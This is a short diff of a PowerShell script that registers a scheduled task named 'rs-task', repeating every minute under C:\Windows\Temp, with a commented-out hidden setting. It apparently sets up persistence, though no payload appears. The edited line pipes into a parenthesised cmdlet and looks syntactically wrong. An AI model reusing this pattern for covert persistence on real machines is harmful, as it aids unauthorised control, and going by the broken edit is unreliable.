@@ -19,7 +19,7 @@ if($taskExists) {
    #$settings = New-ScheduledTaskSettingsSet -Hidden $true;
    $post_trigger = Register-ScheduledTask rs-task -InputObject $task;
    $post_trigger.Triggers.Repetition.Interval = "PT1M";
-   Set-ScheduledTask -TaskPath "C:\Windows\Temp\" -Trigger $post_trigger;
+   $post_trigger | (Set-ScheduledTask -TaskPath "C:\Windows\Temp\");
    #Start-ScheduledTask -TaskName rs-task;
    #note so my dumbass doesnt forget how to get rid of scheduled task in powershell.
    #Unregister-ScheduledTask -TaskName rs-task -Confirm:$false
